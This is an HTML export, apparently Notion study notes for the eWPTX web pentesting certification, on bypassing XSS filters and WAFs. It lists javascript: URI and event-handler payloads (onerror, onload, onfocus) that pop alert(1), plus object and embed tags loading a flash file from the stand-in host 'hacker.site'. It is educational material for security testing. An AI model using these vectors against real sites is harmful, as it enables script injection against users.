@@ -1,0 +1,814 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XSS Filter Evasion</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="cf1f10b7-e4e1-4629-be89-64ff3ca0edab" class="page mono"><header><h1 class="page-title"><strong>XSS Filter Evasion</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="b20422d7-7120-4b1c-ae2f-adfe75fb7a13" class=""><strong>Filter Evasion and WAF Bypassing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#filter-evasion-and-waf-bypassing"></a></strong></h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8485c7eb-cf78-4360-8725-e99aae9719b9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+http://html5sec.org/
+</code></pre><ul id="42aaedd3-01ff-4fe2-be33-e83ee9ce0ba7" class="bulleted-list"><li style="list-style-type:disc">Common scenarios</li></ul><ol type="1" id="ec06808c-8ddb-4222-b891-dc988a4a4b58" class="numbered-list" start="1"><li>The XSS vector is blocked by the application or something else</li></ol><ol type="1" id="ee83fdb1-4d06-4328-8899-cba31fd87dcb" class="numbered-list" start="2"><li>The XSS vector is sanitized</li></ol><ol type="1" id="716af1ef-a320-42bf-b8c5-17e1e416620b" class="numbered-list" start="3"><li>The XSS vector is filtered or blocked by the browser</li></ol><h2 id="17c8fa8a-356c-4c53-bb34-e336f4f30d0e" class=""><strong>Bypassing Blackliting Filters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#bypassing-blackliting-filters"></a></strong></h2><p id="6c581d27-9f8c-43c0-b394-bae81fbe8c62" class="">Its the most common. Their goal is to detect specific patterns and prevent malicious behaviors.</p><h3 id="be931c5c-0345-40d6-a919-9e6f1c5ad5dd" class=""><strong>Inject Script Code</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#inject-script-code"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f1b1f3f-e3d2-4a37-90bc-57e2f1873c56" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+
+# The &lt;script&gt; tag is the primary method which can be used to execute client-side scripting code such as javascript.
+</code></pre><h3 id="48ecf735-e40f-40ab-a343-203f4e49b5b2" class=""><strong>Bypassing Weak script Tag Banning</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#bypassing-weak-script-tag-banning"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d68e7d2-b69a-4828-aae5-027a133a4bdc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Upper and Lower-case characters
+- Upper and Lower-case without closing tag
+- Random string after the tag name
+- Newline after the tag name
+- Nested tags
+- NULL byte (IE up to v9)
+# examples in images
+</code></pre><h2 id="57050543-2f57-4184-a29e-acacc560f9b3" class=""><strong>ModSecurity &gt; Script Tag Based XSS Vectors Rule</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#modsecurity--script-tag-based-xss-vectors-rule"></a></strong></h2><p id="2a53a40d-4d76-41e9-adee-70963c0cc344" class="">There are several alternatives in which its possible to run our code, such as different HTML tags and related event handlers.</p><h3 id="e9084c5b-6720-42b5-9496-0030f38904d4" class=""><strong>Beyond script Tag… Using HTML Attributes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#beyond-script-tag-using-html-attributes"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f36ab643-f270-43a5-a55e-4deace51c644" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;a href=&quot;javascript:alert(1)&quot;&gt;show&lt;/a&gt;
+&lt;a href=&quot;data:text/html;base64,&lt;alert(1) encoded&gt;&quot;show&lt;/a&gt;
+&lt;form action=&quot;javascript:alert(1)&quot;&gt;&lt;button&gt;send&lt;/button&gt;&lt;/form&gt;
+&lt;form id=x&gt;&lt;/form&gt;&lt;button form=&quot;x&quot; formaction=&quot;javascript:alert(1)&quot;&gt;send&lt;/button&gt;
+&lt;object data=&quot;javascript:alert(1)&quot;&gt;
+&lt;object data=&quot;data:text/html;base64, &lt;alert(1) encoded&gt;&quot;&gt;
+
+# https://github.com/evilcos/xss.swf
+&lt;object data=&quot;//hacker.site/xss.swf&quot;&gt;
+&lt;embed code=&quot;//hacker.site/xss.swf&quot; allowscriptaccess=always&gt;
+</code></pre><h3 id="1eb883da-1ab9-4dc4-afa1-f85bde00023c" class=""><strong>Beyond script Tag… Using HTML Events</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#beyond-script-tag-using-html-events"></a></strong></h3><ul id="e813f95c-ae00-4f40-8d42-2d97377f9fea" class="bulleted-list"><li style="list-style-type:disc">Events are they way that HTML DOM adds interactivity between the website and its visitors; This happens simply by executing the client-side code (e.g, JavaScript)</li></ul><p id="ed673b9b-332b-4044-aaac-1fb25b195bcd" class="">Almost all event handler identifier start with <strong>on</strong> and are followerd by the name of the event. One of the most used is <strong>onerror</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0b54e845-9afc-46ab-86ee-1727c4297c27" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=alert(1)&gt;
+</code></pre><p id="2f3b9c80-6a88-4eca-97ef-40dbb452dbb7" class="">→ but, there are maybe other events: http://help.dottoro.com/lhwfcplu.php</p><p id="7d2846be-b3b2-4acc-91f0-1d4ce60ff8d7" class="">Examples:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e3980f4-affb-4481-ab08-39b2e1c4b5ee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;body onload=alert(1)&gt;
+&lt;input type=image src=x:x onerror=alert(1)&gt;
+&lt;isindex onmouseover=&quot;alert(1)&quot; &gt;
+&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;
+&lt;texarea autofocus onfocus=alert(1)&gt;
+&lt;input oncut=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&quot;&gt;
+&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+&lt;marquee onstart=alert(1)&gt;
